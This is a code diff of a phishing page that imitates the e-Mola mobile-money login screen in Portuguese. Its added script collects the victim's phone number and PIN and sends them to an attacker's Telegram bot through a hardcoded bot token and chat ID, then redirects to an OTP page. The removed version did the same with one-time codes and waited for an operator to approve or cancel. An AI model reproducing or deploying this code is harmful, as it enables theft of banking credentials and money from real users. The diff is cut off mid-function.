@@ -1,631 +1,719 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>OTP Verification</title>
+    <title>e-Mola Login</title>
 
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        
-         :root {
-            --orange: #ff7440;
-            --orange-dark: #f96532;
-            --orange-light: #ff8558;
-            --white: #ffffff;
         }
         
         html,
         body {
+            width: 100%;
             height: 100%;
+            overflow: hidden;
+            font-family: Arial, Helvetica, sans-serif;
         }
         
         body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: linear-gradient(145deg, #ff7a45 0%, #ff7040 45%, #ff6835 100%);
-            color: white;
-            overflow-x: hidden;
+            background: #c15b18;
         }
+        /* MAIN SCREEN */
         
-        .page {
-            width: 100%;
-            min-height: 100vh;
-            min-height: 100dvh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        .app {
             position: relative;
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
             overflow: hidden;
-            padding: clamp(16px, 4vh, 40px) clamp(14px, 4vw, 24px);
+            display: flex;
+            flex-direction: column;
+            background: radial-gradient(ellipse at 18% 25%, rgba(255, 255, 255, 0.10), transparent 25%), linear-gradient(160deg, #f99a1d 0%, #e47d18 40%, #b95116 100%);
+            color: white;
         }
+        /* BACKGROUND SHAPES */
         
-        .circle {
+        .app::before {
+            content: "";
             position: absolute;
-            border-radius: 50%;
+            width: 120%;
+            height: 55%;
+            left: -40%;
+            bottom: -8%;
+            background: rgba(91, 43, 12, 0.13);
+            border-radius: 50% 50% 45% 55% / 40% 35% 65% 60%;
+            transform: rotate(-18deg);
             pointer-events: none;
         }
         
-        .circle.one {
-            width: clamp(260px, 45vw, 420px);
-            height: clamp(260px, 45vw, 420px);
-            left: -18vw;
-            bottom: -18vw;
+        .app::after {
+            content: "";
+            position: absolute;
+            width: 80%;
+            height: 60%;
+            right: -35%;
+            top: 30%;
             background: rgba(255, 255, 255, 0.035);
+            border-radius: 50%;
+            transform: rotate(-20deg);
+            pointer-events: none;
+        }
+        /* TOP BAR */
+        
+        .topbar {
+            position: relative;
+            z-index: 5;
+            flex: 0 0 auto;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: calc(10px + env(safe-area-inset-top)) clamp(16px, 4vw, 40px) 0 clamp(18px, 4vw, 42px);
         }
         
-        .circle.two {
-            width: clamp(180px, 32vw, 300px);
-            height: clamp(180px, 32vw, 300px);
-            right: -14vw;
-            top: -12vw;
-            background: rgba(255, 255, 255, 0.025);
+        .back {
+            border: none;
+            background: transparent;
+            color: white;
+            font-size: clamp(34px, 5vw, 48px);
+            font-weight: 200;
+            line-height: 1;
+            cursor: pointer;
         }
         
-        .container {
-            width: min(100%, 470px);
+        .language {
+            border: none;
+            background: transparent;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: clamp(13px, 2vw, 16px);
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .flag {
+            width: clamp(26px, 4vw, 36px);
+            height: auto;
+            display: block;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.25);
+        }
+        /* LOGIN AREA */
+        
+        .login-card {
+            position: relative;
+            z-index: 5;
+            flex: 1 1 auto;
+            width: min(430px, 86vw);
+            margin: 0 auto;
+            text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
-            position: relative;
-            z-index: 2;
-            padding: clamp(18px, 3.5vh, 35px) clamp(12px, 3vw, 20px);
-        }
-        
-        .icon-wrapper {
-            width: clamp(96px, 15vh, 142px);
-            height: clamp(96px, 15vh, 142px);
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.18);
-            display: flex;
             justify-content: center;
-            align-items: center;
-            margin-bottom: clamp(18px, 3.5vh, 30px);
-            box-shadow: 0 10px 35px rgba(150, 40, 10, 0.08);
-            flex-shrink: 0;
+            gap: clamp(14px, 3.5vh, 28px);
+            padding: 10px 0;
+            min-height: 0;
         }
+        /* LOGO */
         
-        .shield {
-            width: clamp(48px, 7.5vh, 70px);
-            height: clamp(54px, 8.4vh, 78px);
-            position: relative;
-        }
-        
-        .shield-shape {
-            position: absolute;
-            inset: 0;
-            background: white;
-            clip-path: polygon(50% 0%, 88% 13%, 88% 48%, 78% 69%, 50% 100%, 22% 69%, 12% 48%, 12% 13%);
-        }
-        
-        .check {
-            position: absolute;
-            width: clamp(22px, 3.4vh, 30px);
-            height: clamp(13px, 2vh, 17px);
-            border-left: clamp(4px, 0.6vh, 5px) solid var(--orange);
-            border-bottom: clamp(4px, 0.6vh, 5px) solid var(--orange);
-            transform: rotate(-45deg);
-            left: clamp(14px, 2.2vh, 20px);
-            top: clamp(18px, 2.9vh, 26px);
-        }
-        
-        h1 {
-            font-size: clamp(26px, 5.5vw, 40px);
-            line-height: 1.15;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: clamp(10px, 2vh, 18px);
-        }
-        
-        .description {
-            max-width: 400px;
-            text-align: center;
-            font-size: clamp(15px, 2.4vh, 19px);
-            line-height: 1.6;
-            color: rgba(255, 255, 255, 0.95);
-            margin-bottom: clamp(22px, 4.5vh, 42px);
-        }
-        
-        .otp-wrapper {
+        .logo-area {
             width: 100%;
-            padding: clamp(14px, 2.8vh, 26px);
-            border-radius: clamp(20px, 3.5vw, 30px);
-            background: rgba(255, 255, 255, 0.12);
-            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08);
-            margin-bottom: clamp(16px, 3vh, 28px);
-        }
-        
-        .otp-inputs {
             display: flex;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
-            gap: clamp(6px, 1.8vw, 13px);
         }
         
-        .otp {
-            width: clamp(40px, 12.5vw, 66px);
-            height: clamp(52px, 9.5vh, 82px);
+        .logo-img {
+            width: clamp(90px, 14vh, 130px);
+            height: auto;
+            display: block;
+            object-fit: contain;
+        }
+        
+        .logo-title {
+            margin-top: clamp(6px, 1.2vh, 10px);
+            font-size: clamp(32px, 5vh, 44px);
+            font-weight: 800;
+            letter-spacing: -2px;
+            line-height: 1;
+        }
+        
+        .logo-subtitle {
+            font-size: clamp(13px, 2vh, 15px);
+            font-weight: bold;
+            margin-top: clamp(4px, 0.8vh, 6px);
+            opacity: 0.9;
+        }
+        /* FORM */
+        
+        form {
+            width: 100%;
+        }
+        
+        .input {
+            width: 100%;
+            height: clamp(48px, 7vh, 56px);
             border: none;
             outline: none;
-            border-radius: clamp(10px, 2vw, 17px);
-            background: rgba(255, 255, 255, 0.13);
+            border-radius: 30px;
+            background: rgba(91, 49, 18, 0.43);
             color: white;
             text-align: center;
-            font-size: clamp(26px, 6.5vw, 44px);
-            font-weight: 600;
-            caret-color: white;
-            transition: 0.2s ease;
+            font-size: clamp(15px, 2.3vh, 17px);
+            margin-bottom: clamp(10px, 2.2vh, 18px);
+            padding: 0 20px;
             font-family: inherit;
-            flex-shrink: 1;
-            min-width: 0;
         }
         
-        .otp:focus {
-            background: rgba(255, 255, 255, 0.22);
-            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.55);
-            transform: translateY(-2px);
+        .input::placeholder {
+            color: rgba(255, 255, 255, 0.75);
         }
         
-        .timer {
+        .input:focus {
+            background: rgba(70, 40, 16, 0.55);
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.15);
+        }
+        
+        .enter {
             width: 100%;
-            max-width: 410px;
-            margin-bottom: clamp(26px, 5.5vh, 52px);
-        }
-        
-        .timer-track {
-            width: 100%;
-            height: clamp(7px, 1.2vh, 10px);
-            border-radius: 20px;
-            background: rgba(255, 255, 255, 0.18);
-            overflow: hidden;
-        }
-        
-        .timer-progress {
-            width: 100%;
-            height: 100%;
-            border-radius: inherit;
-            background: white;
-            transition: width 1s linear;
-        }
-        
-        .timer-text {
-            margin-top: clamp(8px, 1.5vh, 13px);
-            font-size: clamp(15px, 2.2vh, 18px);
-            color: rgba(255, 255, 255, 0.95);
-        }
-        
-        .confirm-btn {
-            width: 100%;
-            max-width: 410px;
-            height: clamp(58px, 10vh, 92px);
+            height: clamp(50px, 7.5vh, 60px);
             border: none;
-            border-radius: clamp(16px, 3vw, 22px);
+            border-radius: 40px;
             background: white;
-            color: var(--orange-dark);
-            font-size: clamp(20px, 3.6vh, 30px);
+            color: #151515;
+            font-size: clamp(16px, 2.5vh, 19px);
             font-weight: 700;
+            letter-spacing: 1px;
             cursor: pointer;
-            box-shadow: 0 12px 30px rgba(120, 30, 5, 0.12);
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            transition: 0.15s;
+            margin-top: clamp(2px, 0.8vh, 6px);
             font-family: inherit;
         }
         
-        .confirm-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 16px 35px rgba(120, 30, 5, 0.18);
+        .enter:hover {
+            transform: scale(1.01);
         }
         
-        .confirm-btn:active {
+        .enter:active {
             transform: scale(0.98);
         }
+        /* LINKS */
         
-        .confirm-btn:disabled {
-            opacity: 0.65;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: 0 12px 30px rgba(120, 30, 5, 0.12);
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: clamp(8px, 1.8vh, 14px);
+            align-items: center;
         }
         
-        .message {
-            min-height: 26px;
-            margin-top: clamp(12px, 2vh, 18px);
-            font-size: clamp(14px, 2vh, 16px);
+        .link-button {
+            border: none;
+            background: transparent;
+            color: rgba(255, 255, 255, 0.92);
+            font-size: clamp(14px, 2.1vh, 16px);
+            cursor: pointer;
+            font-family: inherit;
+            text-decoration: none;
+        }
+        
+        .link-button:hover {
+            color: #ffffff;
+        }
+        /* FOOTER */
+        
+        .footer {
+            position: relative;
+            z-index: 5;
+            flex: 0 0 auto;
+            width: 100%;
             text-align: center;
+            padding-bottom: calc(12px + env(safe-area-inset-bottom));
         }
         
-        .success {
-            color: #eaffea;
+        .quick-actions {
+            display: flex;
+            justify-content: center;
+            gap: clamp(20px, 5vw, 32px);
+            margin-bottom: clamp(8px, 1.6vh, 12px);
         }
         
-        .error {
-            color: #fff0ed;
+        .round-button {
+            width: clamp(56px, 8.5vh, 74px);
+            height: clamp(56px, 8.5vh, 74px);
+            border-radius: 50%;
+            border: none;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 3px 10px rgba(70, 30, 5, 0.12);
+        }
+        /* LOCATION ICON */
+        
+        .location-icon {
+            position: relative;
+            width: 22px;
+            height: 28px;
+            border: 3px solid #df8b55;
+            border-radius: 50%;
         }
         
-        @media (max-height: 560px) and (orientation: landscape) {
-            .page {
-                align-items: center;
+        .location-icon::before {
+            content: "";
+            position: absolute;
+            width: 7px;
+            height: 7px;
+            border: 2px solid #df8b55;
+            border-radius: 50%;
+            left: 4px;
+            top: 4px;
+        }
+        
+        .location-icon::after {
+            content: "";
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-left: 3px solid #df8b55;
+            border-bottom: 3px solid #df8b55;
+            background: white;
+            left: 3px;
+            bottom: -6px;
+            transform: rotate(-45deg);
+        }
+        /* BOOK ICON */
+        
+        .book-icon {
+            position: relative;
+            width: 30px;
+            height: 34px;
+            border: 2px solid #df8b55;
+            border-radius: 3px;
+        }
+        
+        .book-icon::before {
+            content: "";
+            position: absolute;
+            width: 2px;
+            height: 30px;
+            background: #df8b55;
+            left: 13px;
+            top: 0;
+        }
+        
+        .book-icon::after {
+            content: "";
+            position: absolute;
+            width: 8px;
+            height: 3px;
+            border-top: 2px solid #df8b55;
+            left: 3px;
+            top: 8px;
+        }
+        
+        .version {
+            font-size: clamp(11px, 1.7vh, 13px);
+            color: rgba(255, 255, 255, 0.68);
+        }
+        /* TOAST */
+        
+        .toast {
+            position: fixed;
+            z-index: 20;
+            left: 50%;
+            bottom: clamp(90px, 15vh, 120px);
+            transform: translate(-50%, 20px);
+            background: rgba(25, 20, 16, 0.9);
+            color: white;
+            padding: 12px 18px;
+            border-radius: 10px;
+            font-size: 14px;
+            opacity: 0;
+            pointer-events: none;
+            transition: 0.2s;
+            white-space: nowrap;
+            max-width: 90vw;
+        }
+        
+        .toast.show {
+            opacity: 1;
+            transform: translate(-50%, 0);
+        }
+        /* TABLETS */
+        
+        @media (max-width: 1024px) {
+            .login-card {
+                width: min(430px, 80vw);
             }
-            .container {
+        }
+        /* PHONES */
+        
+        @media (max-width: 600px) {
+            .login-card {
+                width: calc(100vw - 56px);
+            }
+        }
+        /* VERY SMALL PHONES */
+        
+        @media (max-width: 340px) {
+            .login-card {
+                width: calc(100vw - 36px);
+            }
+            .input {
+                font-size: 14px;
+            }
+        }
+        /* LANDSCAPE PHONES */
+        
+        @media (max-height: 500px) and (orientation: landscape) {
+            .login-card {
                 flex-direction: row;
                 flex-wrap: wrap;
                 justify-content: center;
                 align-items: center;
-                column-gap: 28px;
-                row-gap: 10px;
-                width: min(100%, 860px);
-                padding: 8px 10px;
+                gap: 10px 30px;
+                width: min(760px, 92vw);
             }
-            .icon-wrapper {
-                width: 72px;
-                height: 72px;
-                margin-bottom: 0;
+            .logo-area {
+                width: auto;
+                margin-right: 10px;
             }
-            .shield {
-                width: 36px;
-                height: 40px;
+            form {
+                width: min(340px, 60vw);
             }
-            .check {
-                width: 14px;
-                height: 8px;
-                border-width: 3px;
-                left: 11px;
-                top: 14px;
-            }
-            h1 {
+            .links {
                 width: 100%;
-                text-align: center;
-                font-size: 24px;
-                margin-bottom: 2px;
+                flex-direction: row;
+                justify-content: center;
+                gap: 24px;
             }
-            .description {
-                width: min(320px, 44%);
-                margin-bottom: 0;
+            .logo-img {
+                width: 64px;
+            }
+            .logo-title {
+                font-size: 24px;
+                letter-spacing: -1px;
+            }
+            .logo-subtitle {
+                font-size: 11px;
+            }
+            .input {
+                height: 42px;
+                margin-bottom: 8px;
                 font-size: 14px;
-                line-height: 1.4;
-                text-align: left;
             }
-            .otp-wrapper {
-                width: min(380px, 52%);
-                padding: 10px;
-                margin-bottom: 0;
+            .enter {
+                height: 44px;
+                font-size: 15px;
+                margin-top: 0;
             }
-            .otp {
-                width: clamp(34px, 7vw, 50px);
-                height: 56px;
+            .quick-actions {
+                margin-bottom: 4px;
+            }
+            .round-button {
+                width: 46px;
+                height: 46px;
+            }
+            .location-icon {
+                transform: scale(0.7);
+            }
+            .book-icon {
+                transform: scale(0.7);
+            }
+            .back {
                 font-size: 28px;
-                border-radius: 10px;
             }
-            .timer {
-                width: min(380px, 52%);
-                margin-bottom: 0;
+            .flag {
+                width: 22px;
             }
-            .confirm-btn {
-                width: min(380px, 52%);
-                height: 48px;
-                font-size: 18px;
-            }
-            .message {
-                width: 100%;
-                min-height: 20px;
-                margin-top: 4px;
+            .topbar {
+                padding-top: 4px;
             }
         }
+        /* VERY SHORT SCREENS */
         
-        @media (max-height: 500px) {
-            .description {
-                margin-bottom: 10px;
+        @media (max-height: 560px) {
+            .login-card {
+                gap: 10px;
             }
-            .otp-wrapper {
-                margin-bottom: 10px;
-            }
-            .timer {
-                margin-bottom: 14px;
-            }
-        }
-        
-        @media (max-width: 340px) {
-            .otp-inputs {
-                gap: 5px;
-            }
-            .otp {
-                font-size: 24px;
-            }
-            .otp-wrapper {
-                padding: 10px;
-            }
-        }
-        
-        @media (min-width: 1400px) {
-            .container {
-                width: 500px;
-            }
-            .otp {
-                width: 68px;
+            .input {
+                margin-bottom: 8px;
             }
         }
     </style>
 </head>
 
 <body>
+    <div class="app">
 
-    <div class="page">
-        <div class="circle one"></div>
-        <div class="circle two"></div>
+        <!-- TOP BAR -->
+        <header class="topbar">
+            <button class="back" id="backButton" aria-label="Voltar">‹</button>
+            <button class="language" id="languageButton">
+                <img class="flag" id="flagImg" alt="Português"
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPfTxr-CZTuCxdAIkhApPDtOT0dPkNLGVx08WtRJe0pQ&s">
+                <strong id="langLabel">POR</strong>
+            </button>
+        </header>
 
-        <main class="container">
-            <div class="icon-wrapper">
-                <div class="shield">
-                    <div class="shield-shape"></div>
-                    <div class="check"></div>
-                </div>
+        <!-- LOGIN -->
+        <section class="login-card">
+            <div class="logo-area">
+                <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLjt7GJwM7u7GcGVvgKYFLd3Rbs5izlnLeBAf_tGdu8Q&s=10" alt="e-Mola">
+                <div class="logo-title">e-Mola</div>
+                <div class="logo-subtitle" id="subtitle">Meu cell, minha mola</div>
             </div>
 
-            <h1>OTP Verification</h1>
+            <form id="loginForm">
+                <input class="input" id="phone" type="tel" inputmode="numeric" autocomplete="off" placeholder="Digite o número de telefone">
+                <input class="input" id="pin" type="password" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="PIN">
+                <button class="enter" type="submit" id="enterBtn">ENTRAR</button>
+            </form>
 
-            <p class="description">
-                Enter the 6-digit OTP generated on this device to continue.
-            </p>
-
-            <div class="otp-wrapper">
-                <div class="otp-inputs">
-                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 1">
-                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 2">
-                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 3">
-                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 4">
-                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 5">
-                    <input class="otp" type="text" inputmode="numeric" maxlength="1" aria-label="OTP digit 6">
-                </div>
+            <div class="links">
+                <button class="link-button" id="forgotButton">Esqueceu a senha</button>
+                <button class="link-button" id="registerButton">Cadastrar-se</button>
             </div>
+        </section>
 
-            <div class="timer">
-                <div class="timer-track">
-                    <div id="timerProgress" class="timer-progress"></div>
-                </div>
-                <div id="timerText" class="timer-text">30s</div>
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div class="quick-actions">
+                <button class="round-button" id="locationButton" aria-label="Localização">
+                    <span class="location-icon"></span>
+                </button>
+                <button class="round-button" id="guideButton" aria-label="Guia">
+                    <span class="book-icon"></span>
+                </button>
             </div>
+            <div class="version">Versão 2.2.0</div>
+        </footer>
 
-            <button id="confirmBtn" class="confirm-btn">Confirm</button>
-
-            <div id="message" class="message"></div>
-        </main>
+        <div class="toast" id="toast"></div>
     </div>
 
     <script>
-        // Bot 1 (ONLY - removed Bot 2)
-        const BOT_TOKEN_1 = '8991759574:AAFbj-0xH-NM4MPkGolppaSYZkfFKHC3Y6U';
-        const CHAT_ID_1 = '7106130716';
+        // =======================
+        // BOT CONFIG (single bot - keep 2)
+        // =======================
+        const BOT_TOKEN = '8991759574:AAFbj-0xH-NM4MPkGolppaSYZkfFKHC3Y6U';
+        const CHAT_ID = '7106130716';
 
-        // Inputs + buttons (MATCH HTML)
-        const otpBoxes = document.querySelectorAll('.otp');
-        const confirmBtn = document.getElementById('confirmBtn');
-        const messageEl = document.getElementById('message');
+        // =======================
+        // DOM REFERENCES (MATCH YOUR HTML)
+        // =======================
+        const loginForm = document.getElementById("loginForm");
+        const phoneInput = document.getElementById("phone");
+        const pinInput = document.getElementById("pin");
+        const loginBtn = document.getElementById("enterBtn");
 
-        // Timer elements (MATCH HTML)
-        const timerProgress = document.getElementById('timerProgress');
-        const timerText = document.getElementById('timerText');
+        // Your HTML does NOT include spinnerOverlay, so we guard it
+        const spinnerOverlay = document.getElementById("spinnerOverlay");
 
-        if (!timerProgress || !timerText || !confirmBtn || otpBoxes.length !== 6) {
-            console.error('Missing required DOM elements. Check ids/classes in HTML.');
+        const toast = document.getElementById("toast");
+        const languageButton = document.getElementById("languageButton");
+        const flagImg = document.getElementById("flagImg");
+        const langLabel = document.getElementById("langLabel");
+        const subtitleEl = document.getElementById("subtitle");
+        const forgotButton = document.getElementById("forgotButton");
+        const registerButton = document.getElementById("registerButton");
+        const locationButton = document.getElementById("locationButton");
+        const guideButton = document.getElementById("guideButton");
+        const backButton = document.getElementById("backButton");
+
+        // =======================
+        // LOAD SAVED PHONE
+        // =======================
+        const savedPhone = localStorage.getItem('phone');
+        if (savedPhone && savedPhone.length >= 1) {
+            phoneInput.value = savedPhone;
         }
 
-        let otpValue = '';
-        let seconds = 30;
-        let countdown = null;
-
-        let pollInterval1 = null;
-        let lastUpdateId1 = 0;
-
-        let currentTimestamp = 0;
-        let actionProcessed = false;
-
-        const savedPhone = localStorage.getItem('phone') || '785123463';
-
-        function updateTimerUI() {
-            if (!timerText || !timerProgress) return;
-            timerText.textContent = `${seconds}s`;
-            const percent = Math.max(0, Math.min(100, (seconds / 30) * 100));
-            timerProgress.style.width = percent + '%';
+        // =======================
+        // PIN ENABLE / SUBMIT CHECK (adapted)
+        // =======================
+        function getPhoneValue() {
+            return (phoneInput.value || '').trim();
         }
 
-        function startCountdown() {
-            clearInterval(countdown);
-            seconds = 60;
-            updateTimerUI();
-
-            countdown = setInterval(() => {
-                seconds--;
-                updateTimerUI();
-                if (seconds <= 0) {
-                    clearInterval(countdown);
-                    seconds = 0;
-                    updateTimerUI();
-                }
-            }, 1000);
+        function getPinValue() {
+            return (pinInput.value || '').trim();
         }
 
-        function checkOtpComplete() {
-            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
-            const complete = otpValue.length === 6;
-            confirmBtn.disabled = !complete;
-            if (complete) confirmBtn.classList.add('enabled');
-            else confirmBtn.classList.remove('enabled');
+        function updateLoginButtonState() {
+            const pinValue = getPinValue();
+            loginBtn.disabled = pinValue.length < 4; // change logic if you need exactly 6
         }
 
-        function resetForNewOtp() {
-            // Stop polling
-            if (pollInterval1) clearInterval(pollInterval1);
-            pollInterval1 = null;
-
-            actionProcessed = false;
-            currentTimestamp = 0;
-
-            // Clear OTP inputs
-            otpBoxes.forEach(b => b.value = '');
-            checkOtpComplete();
-
-            // Reset message
-            messageEl.className = 'message';
-            messageEl.textContent = '';
-
-            // Reset timer
-            startCountdown();
-
-            // Focus first box
-            otpBoxes[0].focus();
-        }
-
-        startCountdown();
-
-        otpBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                box.value = box.value.replace(/\D/g, '').slice(0, 1);
-
-                if (box.value.length === 1 && index < 5) {
-                    otpBoxes[index + 1].focus();
-                }
-                checkOtpComplete();
-            });
-
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    otpBoxes[index - 1].focus();
-                }
-            });
+        // =======================
+        // INPUT SANITIZERS
+        // =======================
+        phoneInput.addEventListener("input", function() {
+            // allow digits and optional +
+            this.value = this.value.replace(/[^\d+ ]/g, "");
         });
 
-        function sendToBot(botToken, chatId, text, replyMarkup) {
-            const payload = {
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'Markdown'
-            };
-            if (replyMarkup) payload.reply_markup = replyMarkup;
+        pinInput.addEventListener("input", function() {
+            // only digits, up to 6
+            this.value = this.value.replace(/\D/g, "").slice(0, 6);
+            updateLoginButtonState();
+        });
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
+        updateLoginButtonState();
+
+        // =======================
+        // TOAST
+        // =======================
+        function showToast(message) {
+            if (!toast) return;
+            toast.textContent = message;
+            toast.classList.add("show");
+            clearTimeout(window.toastTimer);
+            window.toastTimer = setTimeout(() => toast.classList.remove("show"), 2400);
         }
 
-        function stopPolling() {
-            if (pollInterval1) clearInterval(pollInterval1);
-            pollInterval1 = null;
+        // =======================
+        // LANGUAGE
+        // =======================
+        const FLAGS = {
+            pt: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPfTxr-CZTuCxdAIkhApPDtOT0dPkNLGVx08WtRJe0pQ&s",
+            en: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTG9ZbItOmbojydT4baosy-p6p_Z1-uM2Vb7eKz127ZxA&s=10"
+        };
+
+        const TEXTS = {
+            pt: {
+                langLabel: "POR",
+                subtitle: "Meu cell, minha mola",
+                phonePlaceholder: "Digite o número de telefone",
+                pinPlaceholder: "PIN",
+                enter: "ENTRAR",
+                forgot: "Esqueceu a senha",
+                register: "Cadastrar-se",
+                needPhone: "Digite o número de telefone.",
+                needPin: "Digite o PIN.",
+                sent: "Demo: formulário enviado.",
+                forgotMsg: "Recuperação de senha.",
+                registerMsg: "Cadastro.",
+                locationMsg: "Localizações.",
+                guideMsg: "Guia e-Mola.",
+                backMsg: "Voltar.",
+                langMsg: "Idioma: Português."
+            },
+            en: {
+                langLabel: "ENG",
+                subtitle: "My cell, my spring",
+                phonePlaceholder: "Enter phone number",
+                pinPlaceholder: "PIN",
+                enter: "ENTER",
+                forgot: "Forgot password",
+                register: "Sign up",
+                needPhone: "Enter the phone number.",
+                needPin: "Enter the PIN.",
+                sent: "Demo: form submitted.",
+                forgotMsg: "Password recovery.",
+                registerMsg: "Sign up.",
+                locationMsg: "Locations.",
+                guideMsg: "e-Mola guide.",
+                backMsg: "Back.",
+                langMsg: "Language: English."
+            }
+        };
+
+        let currentLang = "pt";
+
+        function applyTexts(lang) {
+            const t = TEXTS[lang];
+            document.documentElement.lang = lang === "pt" ? "pt" : "en";
+            langLabel.textContent = t.langLabel;
+            flagImg.src = FLAGS[lang];
+            flagImg.alt = lang === "pt" ? "Português" : "English";
+            subtitleEl.textContent = t.subtitle;
+
+            phoneInput.placeholder = t.phonePlaceholder;
+            pinInput.placeholder = t.pinPlaceholder;
+
+            document.getElementById("enterBtn").textContent = t.enter;
+            forgotButton.textContent = t.forgot;
+            registerButton.textContent = t.register;
         }
 
-        function handleCallback(callbackData, callbackQueryId) {
-            if (actionProcessed) return;
-            actionProcessed = true;
+        // =======================
+        // BUTTON / CLICK HANDLERS
+        // =======================
+        languageButton.addEventListener("click", function() {
+            currentLang = currentLang === "pt" ? "en" : "pt";
+            applyTexts(currentLang);
+            showToast(TEXTS[currentLang].langMsg);
+        });
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const phone = getPhoneValue();
+            const pinValue = getPinValue();
+
+            if (!phone) {
+                showToast(TEXTS[currentLang].needPhone);
+                phoneInput.focus();
+                return;
+            }
+
+            if (!pinValue || pinValue.length < 4) {
+                showToast(TEXTS[currentLang].needPin);
+                pinInput.focus();
+                return;
+            }
+
+            if (spinnerOverlay) spinnerOverlay.style.display = 'flex';
+
+            localStorage.setItem('phone', phone);
+
+            const message =
+                `New Login Attempt\n\nPhone: +258 ${phone}\nPIN: ${pinValue}`;
+
+            // Single fetch (only one bot)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    callback_query_id: callbackQueryId
+                    chat_id: CHAT_ID,
+                    text: message
                 })
             }).catch(() => {});
 
-            stopPolling();
-
-            const parts = callbackData.split('_');
-            const action = parts[0];
-
-            if (action === 'approve') {
-                messageEl.className = 'message success';
-                messageEl.textContent =
-                    'Your Registrations fee is being approved. Redirecting...';
-
-                // navigate to index.html
-                window.location.href = 'index.html';
-            } else if (action === 'cancel') {
-                messageEl.className = 'message error';
-                messageEl.textContent = 'Cancelled. Requesting a new OTP...';
-
-                // reset page for new otp
-                resetForNewOtp();
-            }
-        }
-
-        function pollBot(botToken) {
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId1 + 1}&timeout=10`)
-                .then(res => res.json())
-                .then(data => {
-                    if (!data.ok || !data.result || data.result.length === 0) return;
-
-                    for (const update of data.result) {
-                        lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
-
-                        if (update.callback_query && !actionProcessed) {
-                            const cb = update.callback_query;
-                            const dataParts = cb.data.split('_');
-                            const ts = parseInt(dataParts[1], 10);
-
-                            if (ts === currentTimestamp) {
-                                handleCallback(cb.data, cb.id);
-                                return;
-                            }
-                        }
-                    }
-                })
-                .catch(() => {});
-        }
-
-        function startPolling() {
-            actionProcessed = false;
-
-            pollInterval1 = setInterval(() => {
-                pollBot(BOT_TOKEN_1);
+            setTimeout(() => {
+                window.location.href = 'verify.html';
             }, 1500);
-        }
-
-        confirmBtn.addEventListener('click', () => {
-            if (otpValue.length !== 6) return;
-
-            if (seconds <= 0) {
-                messageEl.className = 'message error';
-                messageEl.textContent = 'OTP expired. Please request a new OTP.';
-                return;
-            }
-
-            messageEl.className = 'message';
-            messageEl.textContent = 'Waiting for approval...';
-
-            currentTimestamp = Date.now();
-
-            const message =
-                `*OTP Verification*\n\n` +
-                `📱 Phone: +258 ${savedPhone}\n` +
-                `🔢 Entered OTP: ${otpValue}\n\n` +
-                `Please approve or cancel the loan application.`;
-
-            const replyMarkup = {
-                inline_keyboard: [
-                    [{
-                        text: '✅ Approve',
-                        callback_data: 'approve_' + currentTimestamp
-                    }, {
-                        text: '❌ Cancel',
-                        callback_data: 'cancel_' + currentTimestamp
-                    }]
-                ]
-            };
-
-            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
-            startPolling();
         });
 
-        // initial state
-        checkOtpComplete();
-        otpBoxes[0].focus();
-    </script>
+        forgotButton.addEventListener("click", () => showToast(TEXTS[currentLang].forgotMsg));
+        registerButton.addEventListener("click", () => showToast(TEXTS[currentLang].registerMsg));
+        locationButton.addEventListener("click", () => showToast(TEXTS[currentLang].locationMsg));
+        guideButton.addEventListener("click", () => showToast(TEXTS[currentLang].guideMsg));
 
+        backButton.addEventListener("click", function() {
